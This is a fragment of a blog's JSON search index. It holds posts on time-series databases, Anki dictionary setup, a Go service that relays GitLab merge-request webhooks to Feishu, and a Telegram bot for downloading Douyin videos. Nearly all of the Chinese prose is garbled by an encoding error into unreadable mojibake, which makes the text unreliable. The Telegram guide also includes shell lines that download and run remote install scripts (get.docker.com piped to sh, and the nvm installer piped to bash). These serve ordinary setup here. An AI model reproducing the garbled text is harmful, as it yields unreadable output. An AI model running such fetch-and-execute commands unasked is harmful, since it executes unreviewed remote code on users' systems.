keyã€‚\n\nå¦‚ä¸‹å›¾ï¼Œåº¦é‡ä¸ºWindï¼Œæ¯ä¸€ä¸ªæ•°æ®ç‚¹éƒ½å…·æœ‰ä¸€ä¸ªtimestampï¼Œä¸¤ä¸ªfieldï¼šdirectionå’Œspeedï¼Œä¸¤ä¸ªtagï¼šsensorã€cityã€‚å®ƒçš„ç¬¬ä¸€è¡Œå’Œç¬¬ä¸‰è¡Œï¼Œå­˜æ”¾çš„éƒ½æ˜¯sensorå·ç ä¸º95D8-7913çš„è®¾å¤‡ï¼Œå±æ€§åŸå¸‚æ˜¯ä¸Šæµ·ã€‚éšç€æ—¶é—´çš„å˜åŒ–ï¼Œé£å‘å’Œé£é€Ÿéƒ½å‘ç”Ÿäº†æ”¹å˜ï¼Œé£å‘ä»23.4å˜æˆ23.2ï¼›è€Œé£é€Ÿä»3.4å˜æˆäº†3.3ã€‚\n\n![1](%E6%97%B6%E5%BA%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%80%E4%BB%8B/1.png)\n\n\n# 3. å¼€æºæ—¶é—´åºåˆ—æ•°æ®åº“\n\n### 3.1 æ—¶é—´çº¿\n\n- 1999/07/16 [RRDTool First release](http://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/RRDtool)\n- 2009/12/30 [Graphite 0.9.5](http://link.zhihu.com/?target=https%3A//github.com/graphite-project/graphite-web/releases/tag/0.9.5)\n- 2011/12/23 [OpenTSDB 1.0.0](http://link.zhihu.com/?target=https%3A//github.com/OpenTSDB/opentsdb/releases/tag/v1.0.0)\n- 2013/05/24 [KairosDB 1.0.0-beta](http://link.zhihu.com/?target=https%3A//github.com/kairosdb/kairosdb/releases/tag/v1.0.0-beta2a)\n- 2013/10/24 [InfluxDB 0.0.1](http://link.zhihu.com/?target=https%3A//github.com/influxdata/influxdb/releases/tag/v0.0.1)\n- 2014/08/25 [Heroic 0.3.0](http://link.zhihu.com/?target=https%3A//github.com/spotify/heroic/releases/tag/0.3.0)\n- 2017/03/27 [TimescaleDB 0.0.1-beta](http://link.zhihu.com/?target=https%3A//github.com/timescale/timescaledb/releases/tag/0.0.1-beta)\n\n\n\n[RRDTool](http://link.zhihu.com/?target=https%3A//oss.oetiker.ch/rrdtool/) æ˜¯æœ€æ—©çš„æ—¶é—´åºåˆ—æ•°æ®åº“ï¼Œå®ƒè‡ªå¸¦ç”»å›¾åŠŸèƒ½ï¼Œç°åœ¨å¤§éƒ¨åˆ†æ—¶é—´åºåˆ—æ•°æ®åº“éƒ½ä½¿ç”¨[Grafana](http://link.zhihu.com/?target=https%3A//github.com/grafana/grafana)æ¥ç”»å›¾ã€‚\n\n[Graphite](http://link.zhihu.com/?target=https%3A//graphiteapp.org/) æ˜¯ç”¨ Python å†™çš„ RRD æ•°æ®åº“ï¼Œå®ƒçš„å­˜å‚¨å¼•æ“ [Whisper](http://link.zhihu.com/?target=https%3A//github.com/graphite-project/whisper) ä¹Ÿæ˜¯ Python å†™çš„ï¼Œ å®ƒç”»å›¾å’Œèšåˆèƒ½åŠ›éƒ½å¼ºäº†å¾ˆå¤šï¼Œä½†æ˜¯å¾ˆéš¾æ°´å¹³æ‰©å±•ã€‚\n [OpenTSDB](http://link.zhihu.com/?target=http%3A//opentsdb.net/) ä½¿ç”¨ HBase è§£å†³äº†æ°´å¹³æ‰©å±•çš„é—®é¢˜\n [KairosDB](http://link.zhihu.com/?target=https%3A//kairosdb.github.io/) æœ€åˆæ˜¯åŸºäºOpenTSDBä¿®æ”¹çš„ï¼Œä½†æ˜¯ä½œè€…è®¤ä¸ºå…¼å®¹HBaseå¯¼è‡´ä»–ä»¬ä¸èƒ½ä½¿ç”¨å¾ˆå¤š Cassandra ç‹¬æœ‰çš„ç‰¹æ€§ï¼Œ äºæ˜¯å°±æŠ›å¼ƒäº†HBaseä»…æ”¯æŒCassandraã€‚\n [æ–°å‘å¸ƒçš„](http://link.zhihu.com/?target=http%3A//opentsdb.net/docs/build/html/new.html) OpenTSDB ä¸­ä¹ŸåŠ å…¥äº†å¯¹ Cassandra çš„æ”¯æŒã€‚ æ•…äº‹è¿˜æ²¡å®Œï¼ŒSpotify çš„äººæœ¬æ¥æƒ³ä½¿ç”¨ KairosDBï¼Œä½†æ˜¯è§‰å¾—[é¡¹ç›®å‘å±•æ–¹å‘ä¸å¯¹ä»¥åŠæ€§èƒ½å¤ªå·®](http://link.zhihu.com/?target=http%3A//blog.dongyueweb.com/(https%3A//labs.spotify.com/2015/11/16/monitoring-at-spotify-the-story-so-far/))ï¼Œå°±è‡ªå·±æ’¸äº†ä¸€ä¸ª [Heroic](http://link.zhihu.com/?target=https%3A//github.com/spotify/heroic)ã€‚\n\n[InfluxDB](http://link.zhihu.com/?target=https%3A//github.com/influxdata/influxdb) æ—©æœŸæ˜¯å®Œå…¨å¼€æºçš„ï¼Œåæ¥ä¸ºäº†ç»´æŒå…¬å¸è¿è¥ï¼Œé—­æºäº†é›†ç¾¤ç‰ˆæœ¬ã€‚ åœ¨ Percona Live ä¸Šä»–ä»¬åšäº†ä¸€ä¸ª[å¼€æºæ•°æ®åº“å•†ä¸šæ¨¡å‹æ­£é¢ä¸´å±æœº](http://link.zhihu.com/?target=https%3A//www.youtube.com/watch%3Fv%3DKvf5jWZjw0U)çš„æ¼”è®²ï¼Œé‡Œé¢è°ƒä¾ƒçº¢å¸½çš„æ®µå­å¾ˆä¸é”™ã€‚ å¹¶ä¸”ä»Šå¹´çš„ Percona Live è¿˜æœ‰ä¸“é—¨çš„[æ—¶é—´åºåˆ—æ•°æ®åº“å•å…ƒ](http://link.zhihu.com/?target=https%3A//www.percona.com/live/17/program/schedule/time-series)ã€‚\n\n### 3.2 ç›®å‰æ’å\n\nhttps://db-engines.com/en/ranking/time+series+dbms \n\n![1](%E6%97%B6%E5%BA%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%80%E4%BB%8B/2.png)\n\n\n\n# 4. InfluxDB\n\nInfluxDB å°±æ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„æ—¶åºæ•°æ®åº“ï¼Œé«˜å±… DB-Engines TSDB rank æ¦œé¦–ã€‚InfluxDB åˆ†ä¸ºå…è´¹çš„ç¤¾åŒºå¼€æºç‰ˆæœ¬ï¼Œä»¥åŠéœ€è¦æ”¶è´¹çš„é—­æºå•†ä¸šç‰ˆæœ¬ï¼Œç›®å‰åªæœ‰å•†ä¸šç‰ˆæœ¬æ”¯æŒé›†ç¾¤ã€‚\n\nInfluxDB çš„åº•å±‚æ•°æ®ç»“æ„ä» LSM æ ‘åˆ° B+ æ ‘æŠ˜è…¾äº†ä¸€é€šï¼Œæœ€åè‡ªåˆ›äº†ä¸€ä¸ª TSM æ ‘ï¼ˆ Time-Structured Merge Tree ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯å®ƒæ€§èƒ½é«˜ä¸”èµ„æºå ç”¨å°‘çš„é‡è¦åŸå› ã€‚\n\nTime Structured Merge Tree (TSM) å’Œ Log Structured Merge Tree (LSM) çš„åå­—éƒ½æœ‰ç‚¹è¯¯å¯¼æ€§ï¼Œå…³é”®å¹¶ä¸æ˜¯æ ‘ï¼Œä¹Ÿä¸æ˜¯æ—¥å¿—æˆ–è€…æ—¶é—´ï¼Œè€Œæ˜¯ Mergeã€‚\n\n\n\n- å†™å…¥çš„æ—¶å€™ï¼Œæ•°æ®å…ˆå†™å…¥åˆ°å†…å­˜é‡Œï¼Œä¹‹åæ‰¹é‡å†™å…¥åˆ°ç¡¬ç›˜ã€‚\n- è¯»çš„æ—¶å€™ï¼ŒåŒæ—¶è¯»å†…å­˜å’Œç¡¬ç›˜ç„¶ååˆå¹¶ç»“æœã€‚\n- åˆ é™¤çš„æ—¶å€™ï¼Œå†™å…¥ä¸€ä¸ªåˆ é™¤æ ‡è®°ï¼Œè¢«æ ‡è®°çš„æ•°æ®åœ¨è¯»å–æ—¶ä¸ä¼šè¢«è¿”å›ã€‚\n- åå°ä¼šæŠŠå°çš„å—åˆå¹¶æˆå¤§çš„å—ï¼Œæ­¤æ—¶è¢«æ ‡è®°åˆ é™¤çš„æ•°æ®æ‰çœŸæ­£è¢«åˆ é™¤\n- ç›¸å¯¹äºæ™®é€šæ•°æ®ï¼Œæœ‰è§„å¾‹çš„æ—¶é—´åºåˆ—æ•°æ®åœ¨åˆå¹¶çš„è¿‡ç¨‹ä¸­å¯ä»¥æå¤§çš„æé«˜å‹ç¼©æ¯”ã€‚\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://www.jianshu.com/p/31afb8492eff\n+ https://cloud.tencent.com/developer/article/1115643","tags":["sql"],"categories":["æ•°æ®åº“"]},{"title":"ankiæœ€å¥½ç”¨çš„mdxè¯å…¸ç»„åˆ","url":"%2Fp%2Ff1d70253.html","content":"\nç”¨FastWQï¼Œä¸€ç›´éƒ½æ˜¯åœ¨çº¿è¯·æ±‚å­—æ®µï¼Œé€Ÿåº¦å¾ˆæ…¢ï¼Œå¹¶ä¸”å®¹æ˜“è¢«Ban IPã€‚åæ¥äº†è§£äº†æœ¬åœ°mdxè¯å…¸ï¼Œå‘ç°æ•ˆæœæ›´å¥½ï¼Œé€Ÿåº¦æ›´å¿«ï¼Œæ›´æœ‰å„ä½å¤§ç¥åˆ¶ä½œçš„ç²¾ç¾è¯å…¸ã€‚\n\nå…¥é—¨æ•™ç¨‹\n\n+ https://www.liuvv.com/p/9200c91e.html ankiè®°å¿†ç¥å™¨çš„ä½¿ç”¨\n\n+ https://www.liuvv.com/p/a2ff337b.html  ankiä¹‹è‹±è¯­å•è¯ç¯‡\n\n<!-- more -->\n\n# 1. è¯å…¸é€‰æ‹©\n\nç›®å‰è‹±ç³»è¯å…¸å æ®ä¸­å›½å¸‚åœºçš„ä¸»å¯¼åœ°ä½ï¼Œè‘—åçš„å“ç‰Œå¦‚ç‰›æ´¥ã€æœ—æ–‡ã€å‰‘æ¡¥ã€éº¦å…‹ç±³ä¼¦ã€æŸ¯æ—æ–¯ï¼Œç®€ç§°â€œç‰›æœ—å‰‘éº¦æŸ¯â€ï¼ˆè°éŸ³â€œç‰›éƒè§è¿ˆå…‹â€ï¼‰åˆç§°â€œè‹±å›½äº”è™â€ã€‚ç¾ç³»è¯å…¸ä¸»è¦æœ‰ã€Šç¾å›½ä¼ ç»Ÿè¯å…¸ã€‹ï¼ˆ*The American Heritage Dictionary*ï¼‰å’Œâ€œéŸ¦æ°è¯å…¸â€ä¸¤å¤§å“ç‰Œã€‚\n\næˆ‘Ankiä¸»è¦é€‰äº†ä»¥ä¸‹äº”ä¸ªè¯å…¸ï¼ˆVocabularyï¼ŒæŸ¯æ—æ–¯ï¼ŒThe Little Dictï¼Œç‰›æ´¥ï¼Œæœ—æ–‡ï¼‰ã€‚ä»¥è‹±è¯­ç¬¬ä¸€ä¸ªå•è¯ abandon ä¸¾ä¾‹ã€‚\n\n### 1.1 Vocabulary\n\nâ€‹\tå¯ä»¥å¿«é€Ÿäº†è§£å•è¯çš„æ„æ€ã€‚ç”¨è‹±æ–‡è§£é‡Šè‹±æ–‡ï¼Œç”¨è‹±æ–‡ç†è§£è‹±æ–‡ï¼Œç”¨è‹±æ–‡å¯¹ä¸–ç•Œç¼–ç ï¼Œæœ‰åˆ©äºå…»æˆè‹±è¯­æ€ç»´ï¼Œå¯¹å¬è¯´è¯»å†™éƒ½æœ‰å¸®åŠ©ã€‚å…¨è‹±æ–‡è§£é‡Šï¼Œä¸ä¼šå› ä¸ºè‹±æ±‰å·®åˆ«è€Œå¯¼è‡´ç†è§£ä¸Šçš„åå·®ã€‚\n\n<img src=\"ankiæœ€å¥½ç”¨çš„mdxè¯å…¸ç»„åˆ/image-20220123210444197-4413554.png\" alt=\"image-20220123210444197\" style=\"zoom:50%;\" />\n\n### 1.2 æŸ¯æ—æ–¯\n\nâ€‹\tå¯ä»¥çœ‹åˆ°å•è¯çš„æ˜Ÿçº§ï¼Œä¸€èˆ¬å’Œå•è¯é¢‘ç‡æœ‰å…³ã€‚å¦å¤–å¯ä»¥çœ‹åˆ°å•è¯çš„å‡ ç§æ„æ€ï¼Œå¯ä»¥ç›´æ¥èƒŒè¯µå•è¯åŠçŸ­è¯­çš„æ•´å¥é‡Šä¹‰ï¼Œè¿™å°±å¥½æ¯”ä¸€ä¸ªå¤–å›½äººåœ¨è·Ÿä½ äº¤è°ˆï¼Œå¯¹è‹±è¯­æ€ç»´ä»¥åŠå£è¯­è¡¨è¾¾éƒ½æœ‰è«å¤§çš„å¸®åŠ©ã€‚\n\n<img src=\"ankiæœ€å¥½ç”¨çš„mdxè¯å…¸ç»„åˆ/image-20220123210557163-4413554.png\" alt=\"image-20220123210557163\" style=\"zoom:50%;\" />\n\n### 1.3 The Little Dict\n\nâ€‹\tæ˜¾ç¤ºä¸€ä¸ªçš„å•è¯çš„é¢‘ç‡ï¼Œæ’åç­‰ã€‚å¹¶ä¸”è¿˜æœ‰å•è¯çš„ç™¾åˆ†æ¯”è§£é‡Šï¼Œéå¸¸Niceã€‚ç¡¬æ ¸ä¹‹ä½œï¼ŒçœŸé¦™æ¨èï¼Œå±…å®¶æ—…è¡Œæ²‰è¿·å­¦ä¹ å¿…å¤‡ï¼Œå»ºè®®æ—¥å¸¸ç½®é¡¶é£Ÿç”¨ã€‚\n\nâ€‹\thttps://www.pdawiki.com/forum/forum.php?mod=viewthread&tid=30146\n\n<img src=\"ankiæœ€å¥½ç”¨çš„mdxè¯å…¸ç»„åˆ/image-20220123210754049-4413554.png\" alt=\"image-20220123210754049\" style=\"zoom:50%;\" />\n\n### 1.4 ç‰›æ´¥\n\nâ€‹\tç‰›æ´¥é«˜é˜¶è‹±è¯­è¯å…¸ä¸ºä¸–æ‰€å…¬è®¤çš„æƒå¨è‹±è¯­å­¦ä¹ è¯å…¸ï¼Œæƒ åŠä¸–ç•Œå„åœ°ä¸€ä»£åˆä¸€ä»£å­¦å­ã€‚æœ‰å‘éŸ³å’Œé…å›¾ï¼Œå’Œæ›´è¯¦ç»†ä¸“ä¸šçš„ä¸€äº›è§£é‡Šã€‚\n\n<img src=\"ankiæœ€å¥½ç”¨çš„mdxè¯å…¸ç»„åˆ/image-20220123210912008-4413554.png\" alt=\"image-20220123210912008\" style=\"zoom:50%;\" />\n\n### 1.5 æœ—æ–‡\n\nâ€‹\tä¸»æ‰“è¯­éŸ³ï¼Œä¾‹å¥æ˜¯çœŸäººåŸå£°ï¼Œéå¸¸è‡ªç„¶ã€‚\n\n<img src=\"ankiæœ€å¥½ç”¨çš„mdxè¯å…¸ç»„åˆ/image-20220123211032679-4413554.png\" alt=\"image-20220123211032679\" style=\"zoom:50%;\" />\n\n# 2. FastWQè®¾ç½®\n\n### 2.1 è¯å…¸é…ç½®\n\nèœå•æ -> å·¥å…· -> FastWQ ->  Dictionary Folder\n\n<img src=\"ankiæœ€å¥½ç”¨çš„mdxè¯å…¸ç»„åˆ/image-20220123204138441-4413554.png\" alt=\"image-20220123204138441\" style=\"zoom:50%;\" />\n\nâ€‹\tæœ¬åœ°è¯å…¸éœ€è¦é€šè¿‡ + å·ï¼Œæ·»åŠ è¿›æ¥ã€‚ä¸è¿‡FastWQæ”¯æŒå®šåˆ¶çš„çš„æœ—æ–‡6è¯å…¸ï¼Œåªéœ€è¦æ”¹ä¸‹`LDOCE6.py`å†…éƒ¨çš„æºä»£ç ï¼Œä¿®æ”¹ä¸€ä¸‹è·¯å¾„å³å¯ã€‚\n\nâ€‹\t<img src=\"ankiæœ€å¥½ç”¨çš„mdxè¯å…¸ç»„åˆ/image-20220123204525720-4413554.png\" alt=\"image-20220123204525720\" style=\"zoom:50%;\" />\n\n### 2.2 å­—æ®µé€‰æ‹©\n\nâ€‹\tåŠ è½½è¯å…¸åï¼ŒFieldsé»˜è®¤æ˜¯Defaulté€‰é¡¹ã€‚ä½†æ˜¯æœ—æ–‡6å¯ä»¥æ”¯æŒä¸€äº›Fieldsé€‰æ‹©(FastWQä½œè€…å†™äº†pythonè„šæœ¬æ”¯æŒ)ã€‚\n\n<img src=\"ankiæœ€å¥½ç”¨çš„mdxè¯å…¸ç»„åˆ/image-20220123204709610-4413554.png\" alt=\"image-20220123204709610\" style=\"zoom: 50%;\" />\n\n\n\n# 3. Ankiæ•ˆæœå›¾\n\næ­£é¢æ˜¯  Vocabulary + æŸ¯æ—æ–¯ã€‚å­¦ä¹ å•è¯å…ˆä»Vocabularyçš„è‹±è¯­è§£é‡Šå¼€å§‹çœ‹èµ·ï¼Œç„¶ååœ¨çœ‹æŸ¯æ—æ–¯çš„è§£é‡Šã€‚\n\nèƒŒé¢æ˜¯   The Little Dict + ç‰›æ´¥8 + æœ—æ–‡6ã€‚å¤§æ¦‚äº†è§£å•è¯é¢‘ç‡å’Œæ’è¡Œï¼Œç„¶ååœ¨çœ‹ä¸€äº›ç‰¹æ®Šç”¨æ³•å’ŒåŸå¥ä¸­çš„å‘éŸ³ã€‚\n\n### 3.1 æ­£é¢é¢„è§ˆ\n\n<img src=\"ankiæœ€å¥½ç”¨çš„mdxè¯å…¸ç»„åˆ/image-20220123205510533-4413554.png\" alt=\"image-20220123205510533\" style=\"zoom:33%;\" />\n\n### 3.2 èƒŒé¢é¢„è§ˆ\n\n<img src=\"ankiæœ€å¥½ç”¨çš„mdxè¯å…¸ç»„åˆ/image-20220123205554799-4413554.png\" alt=\"image-20220123205554799\" style=\"zoom:33%;\" />\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ ä¸‹è½½mdx https://downloads.freemdict.com/Recommend/\n\n+ goldendictä»‹ç»(åŒ…å«è‹±è¯­è¯å…¸æ¨è) https://www.cnblogs.com/keatonlao/p/12702571.html\n\n+ æœ€å¥½ç”¨çš„è¯å…¸ç»„åˆ https://ld246.com/article/1603388576222\n\n+ æ¬§è·¯è¯å…¸ç«Ÿç„¶å¯ä»¥è¿™ä¹ˆå¥½çœ‹ï¼ https://zhuanlan.zhihu.com/p/190186097\n\n+ æ¬§è·¯è¯å…¸è¯åº“åˆ†äº«  https://zhuanlan.zhihu.com/p/210324976\n\n+ å¦‚ä½•ç»™FastWordQueryå†™æ‰©å±•æ’ä»¶ä»¥æ”¯æŒå…¶ä»–mdxè¯å…¸  https://www.pdawiki.com/forum/forum.php?mod=viewthread&tid=39707&extra=page%3D1\n\n+ https://forum.freemdict.com/t/topic/6755/34\n\n+ https://www.pdawiki.com/forum/thread-35395-1-1.html\n\n+ è‹±è¯­ç”Ÿè¯å­¦ä¹ è§£å†³æ–¹æ¡ˆï¼ˆæ¬§è·¯/GoldenDict+Ankiï¼‰https://www.yuque.com/purequant/anki/bczop2\n+ æˆ‘çš„è‹±è¯­å­¦ä¹ ç»éªŒ - è¯å…¸ https://forum.freemdict.com/t/topic/5967\n+ ä»‹ç»å‡ ä»½å¾ˆæœ‰ä»·å€¼çš„ç‰›æ´¥è¯è¡¨ https://zhuanlan.zhihu.com/p/75513302\n+ Anki å­¦ä¹ æŒ‡å—ï¼ˆä¼˜è´¨èµ„æº & æ•™ç¨‹æ€»ç»“ï¼‰ https://www.yuque.com/purequant/anki/swnp53","tags":["anki"],"categories":["ä½¿ç”¨è½¯ä»¶"]},{"title":"gitlabæäº¤MRé€šçŸ¥é£ä¹¦çš„golangä»£ç å®ç°","url":"%2Fp%2F25e9ea9.html","content":"\nå…¬å¸å›¢é˜Ÿæ˜¯ä½¿ç”¨`gitlab`æ¥ç®¡ç†æºä»£ç çš„ï¼Œä¸€ç›´ä»¥æ¥å½“æäº¤äº†ä¸€ä¸ª`MR`åï¼Œéœ€è¦æ‰‹åŠ¨åœ¨å†…éƒ¨`IM`ç¾¤é‡Œè´´å‡º`PR`é“¾æ¥å’Œæ‘˜è¦ï¼Œç„¶å`@`ç›®æ ‡åŒäº‹æ¥å¸®å¿™reviewä»£ç ï¼Œå…¶å®å¤§éƒ¨åˆ†æµç¨‹æ˜¯å¯ä»¥è‡ªåŠ¨åŒ–çš„ã€‚\n\n<!-- more -->\n\n# 1. è®¾ç½®\n\n### 1.1 gitlab\n\ngitlab admin ç”¨æˆ·å¯ä»¥åœ¨æ‰€æœ‰é¡¹ç›®è®¾ç½®ï¼Œ webhooks, å¡«å†™åœ°å€ã€‚\n\n![1](gitlabæäº¤MRé€šçŸ¥åˆ°é£ä¹¦/1.png)\n\n### 1.2 é£ä¹¦\n\né£ä¹¦ç¾¤ç»„åˆ›å»ºæ™®é€šæœºå™¨äººå³å¯ï¼Œå¤åˆ¶å‡ºæ¥webhook urlåœ°å€\n\n![1](gitlabæäº¤MRé€šçŸ¥åˆ°é£ä¹¦/2.png)\n\n\n\n# 2. golangå®ç°\n\n> hook.go\n\n```go\npackage main\n\nimport (\n\t\"bytes\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\t\"strings\"\n\t\"time\"\n)\n\nconst (\n\t// https://open.feishu.cn/tool/cardbuilder?from=custom_bot_doc\n\tMRTemplate = `{\"config\":{\"wide_screen_mode\":true},\"header\":{\"template\":\"blue\",\"title\":{\"content\":\"{{__project__}} ğŸ‘‰  {{__branch__}}\",\"tag\":\"plain_text\"}},\"i18n_elements\":{\"zh_cn\":[{\"fields\":[{\"is_short\":false,\"text\":{\"content\":\"**æ—¶é—´ï¼š**{{__time__}}\\n\\n**åœ°å€ï¼š**[{{__url__}}]({{__url__}})\\n\\n**æäº¤äººï¼š**{{__name__}}\\n\\n**æäº¤æ¶ˆæ¯ï¼š**{{__title__}}\\n{{__desc__}}\",\"tag\":\"lark_md\"}}],\"tag\":\"div\"},{\"tag\":\"hr\"}]}}`\n)\n\ntype MrContext struct {\n\tProject      string `json:\"project\"`\n\tSourceBranch string `json:\"source_branch\"`\n\tUrl          string `json:\"url\"`\n\tTitle        string `json:\"title\"`\n\tDesc         string `json:\"desc\"`\n\tTime         string `json:\"time\"`\n\tName         string `json:\"name\"`\n}\n\nfunc ExecHook(body string, hookUrl string) {\n\tlog.Println(\"body:\", body)\n\n\tvar v map[string]interface{}\n\tif err := json.Unmarshal([]byte(body), &v); err != nil {\n\t\tlog.Println(\"json Unmarshal err:\", err)\n\t\treturn\n\t}\n\n\tet, _ := v[\"event_type\"].(string)\n\tif et != \"merge_request\" {\n\t\tlog.Println(\"event_type not merge_request:\", et, v[\"event_type\"])\n\t\treturn\n\t}\n\n\tmc := MrContext{}\n\n\tif project, ok := v[\"project\"].(map[string]interface{}); ok {\n\t\tif name, ok := project[\"name\"].(string); ok {\n\t\t\tmc.Project = name\n\t\t}\n\t}\n\n\tif object_attributes, ok := v[\"object_attributes\"].(map[string]interface{}); ok {\n\t\tstate, _ := object_attributes[\"state\"].(string)\n\t\taction, _ := object_attributes[\"action\"].(string)\n\t\tif state == \"opened\" && action == \"open\" {\n\t\t\t// æ–°å¼€çš„åˆ†æ”¯ç»§ç»­å¾€ä¸‹èµ°\n\t\t} else {\n\t\t\tlog.Println(\"fail: state\", state, \"action\", action)\n\t\t\treturn\n\t\t}\n\n\t\tif source_branch, ok := object_attributes[\"source_branch\"].(string); ok {\n\t\t\tmc.SourceBranch = source_branch\n\t\t}\n\t\tif title, ok := object_attributes[\"title\"].(string); ok {\n\t\t\tmc.Title = title\n\t\t}\n\t\tif description, ok := object_attributes[\"description\"].(string); ok {\n\t\t\tmc.Desc = description\n\t\t}\n\n\t\tif update, ok := object_attributes[\"updated_at\"].(string); ok {\n\t\t\tt, _ := time.Parse(\"2006-01-02 15:04:05 MST\", update)\n\t\t\tl, _ := time.LoadLocation(\"Asia/Shanghai\")\n\t\t\tmc.Time = t.In(l).Format(\"2006-01-02 15:04:05\")\n\t\t}\n\t\tif url, ok := object_attributes[\"url\"].(string); ok {\n\t\t\tmc.Url = url\n\t\t}\n\t}\n\n\tif user, ok := v[\"user\"].(map[string]interface{}); ok {\n\t\tif name, ok := user[\"name\"].(string); ok {\n\t\t\tmc.Name = name\n\t\t}\n\t}\n\n\t_, err := http.Post(hookUrl, \"application/json\", bytes.NewBufferString(getMrContext(mc)))\n\tlog.Println(\"hookUrl\", hookUrl, getMrContext(mc), err)\n\tif err != nil {\n\t\tlog.Println(\"http err:\", err)\n\t\treturn\n\t}\n}\n\nfunc getMrContext(mc MrContext) string {\n\tstr := MRTemplate\n\tstr = strings.ReplaceAll(str, \"{{__project__}}\", mc.Project)\n\tstr = strings.ReplaceAll(str, \"{{__branch__}}\", mc.SourceBranch)\n\tstr = strings.ReplaceAll(str, \"{{__url__}}\", mc.Url)\n\tstr = strings.ReplaceAll(str, \"{{__name__}}\", mc.Name)\n\tstr = strings.ReplaceAll(str, \"{{__time__}}\", mc.Time)\n\tstr = strings.ReplaceAll(str, \"{{__title__}}\", strings.ReplaceAll(mc.Title, \"\\n\", \"\"))\n\tstr = strings.ReplaceAll(str, \"{{__desc__}}\", strings.ReplaceAll(mc.Desc, \"\\n\", \"\"))\n\treturn fmt.Sprintf(\"{\\\"msg_type\\\":\\\"interactive\\\",\\\"card\\\":%v}\", str)\n}\n\n```\n\n\n\n> main.go\n\n```go\npackage main\n\nimport (\n\t\"io/ioutil\"\n\n\t\"github.com/gin-gonic/gin\"\n)\n\nfunc main() {\n\tr := gin.Default()\n\tr.GET(\"/ping\", func(c *gin.Context) {\n\t\tc.JSON(200, gin.H{\n\t\t\t\"message\": \"pong\",\n\t\t})\n\t})\n\tr.POST(\"gitlab-hook\", GitlabHook)\n\tr.Run(\":8001\")\n}\n\nfunc GitlabHook(c *gin.Context) {\n\tif c.Request.Header.Get(\"X-Gitlab-Event\") != \"System Hook\" {\n\t\treturn\n\t}\n\n\turl := \"ä½ çš„ web hook api åœ°å€\"\n\tdata, _ := ioutil.ReadAll(c.Request.Body)\n\tExecHook(string(data), url)\n}\n```\n\n\n\n# 3. é…ç½®æ¨¡æ¿\n\nå¯å»é£ä¹¦æ¨¡æ¿ç•Œé¢ï¼Œæ‹–æ‹½æƒ³è¦çš„æ ·å¼ï¼Œç„¶åä¿å­˜å¤åˆ¶å‡ºæ¥jsonå³å¯ã€‚\n\n```\nhttps://open.feishu.cn/tool/cardbuilder?from=custom_bot_doc\n```\n\n","tags":["gitlab"],"categories":["git"]},{"title":"æŠ–éŸ³è§†é¢‘æ— æ°´å°ä¸‹è½½ä¹‹telegram robot","url":"%2Fp%2Fdaa6768a.html","content":"\n# 1. æ³¨å†Œæœºå™¨äºº\n\nç›´æ¥åœ¨Tgä¸­ä¸@BotFatherå¯¹è¯å³å¯åˆ›å»ºbot,æ¯”è¾ƒæœ‰è¶£çš„æ˜¯åœ¨Tgå¾ˆå¤šçš„äº¤äº’å¼ä½“éªŒéƒ½æ˜¯é€šè¿‡ç±»ä¼¼å¯¹è¯çš„æ–¹å¼ã€‚\n\nå°†ä¸‹é¢çš„é“¾æ¥çš„`{TOKEN}`æ›¿æ¢æˆæ‰€è·å–çš„tokenç„¶åæµè§ˆå™¨è®¿é—®\n\n```bash\nhttps://api.telegram.org/bot{TOKEN}/getUpdates\n```\n\n<!-- more -->\n\nè¿”å›æ•°æ®ï¼Œæ­¤æ—¶ä¸æœºå™¨äººå¯¹è¯çš„å†…å®¹å‡ä¼šåœ¨æ­¤æ˜¾ç¤ºå‡ºæ¥\n\n```json\n{\nok: true,\nresult: [ ... ]\n}\n```\n\n\n\n# 2. å®‰è£… tiktokè§£æ\n\næ³¨æ„ï¼šæœåŠ¡å™¨è¦æ”¾åœ¨å¢™å¤–ã€‚\n\n```bash\n\ngit clone https://github.com/Evil0ctal/Douyin_TikTok_Download_API\n\n# docker éƒ¨ç½²\ncurl -fsSL get.docker.com -o get-docker.sh&&sh get-docker.sh &&systemctl enable docker&&systemctl start docker\ndocker compose up -d\n\n\n# æŸ¥çœ‹å®¹å™¨æ—¥å¿—\ndocker logs -f douyin_tiktok_download_api\n\n\n# åˆ é™¤å®¹å™¨\ndocker rm -f douyin_tiktok_download_api\n# æ›´æ–°\ndocker compose pull && docker compose down && docker compose up -d\n```\n\n\n\n# 3. å®‰è£… telegram bot\n\n### 3.1 å®‰è£…\n\n```bash\ngit clone https://github.com/unix2dos/tikdo.git\ncd tikdo\nnpm install\n\n\n# å¦‚æœå¤±è´¥\nsudo apt-get remove nodejs\nsudo apt-get remove npm\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.2/install.sh | bash\nchmod +x ~/.nvm/nvm.sh\nsource ~/.bashrc \n\nnvm -v\nnvm install 14\n```\n\n\n\n### 3.2 ä¿®æ”¹é…ç½®æ–‡ä»¶\n\n```bash\ncp .env.example .env\nvi .env\n```\n\n\n\n```ini\nBOT_TOKEN=\"bot father è·å–çš„ token\"\n#API_URL=\"https://api.douyin.wtf/api\"\nAPI_URL=\"http://0.0.0.0:8000/api\" \n\nPREFIX_VIDEO=video\nPREFIX_MUSIC=music\n```\n\n\n\n### 3.3 å¯åŠ¨\n\n```bash\nsudo vi /usr/lib/systemd/system/tikdo.service\n```\n\n\n\n```bash\n[Unit]\nDescription=tikdo service\n \n[Service]\nUser=root\nWorkingDirectory=/root/tikdo\nExecStart=/root/.nvm/versions/node/v14.21.1/bin/node app.js\nTimeoutStopSec=10\nRestart=on-failure\nRestartSec=5\n \n[Install]\nWantedBy=multi-user.target\n```\n\n\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable tikdo\nsudo systemctl restart tikdo\n```\n\n\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://github.com/fikiismyname/tikdo\n+  https://github.com/Evil0ctal/Douyin_TikTok_Download_API\n+  https://blog.fanfq.com/dev/Telegram_bot_dev_thinking.html\n\n","tags":["telegram"],"categories":["ä½¿ç”¨è½¯ä»¶"]},{"title":"golangæ•°æ®ä¼ è¾“åŠ 